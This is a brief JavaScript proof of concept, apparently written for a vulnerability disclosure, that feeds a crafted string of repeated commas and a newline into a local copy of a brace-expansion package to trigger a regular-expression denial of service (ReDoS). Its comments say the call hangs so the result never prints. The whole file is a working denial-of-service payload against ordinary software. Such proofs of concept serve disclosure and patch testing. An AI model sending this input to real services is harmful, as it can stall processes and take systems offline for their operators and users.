//must do npm install concat-map as it is required by the vulnerable version

var expand = require('./package/index.js');

var expanded = expand('{,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n}')

console.log(expanded) //This will cause a ReDoS and the result will not be shown
